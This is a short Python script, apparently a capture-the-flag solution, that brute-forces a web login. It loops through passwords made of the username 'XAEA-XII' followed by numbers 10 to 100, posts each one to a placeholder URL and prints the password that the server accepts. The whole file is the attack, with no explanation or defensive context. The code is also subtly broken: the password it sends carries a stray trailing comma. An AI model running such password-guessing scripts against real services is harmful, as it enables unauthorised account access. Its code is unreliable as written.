import requests

url = "link"
username = "XAEA-XII"
for i in range(10,101):
    http = requests.post(url,data = {'action':'/login'},json = {'username':username,'password':f"{username}{i},",'login':"login"})
    content = http.json()
    if content['success'] == True:
        print("password is "+ f"{username}{i}")
        exit()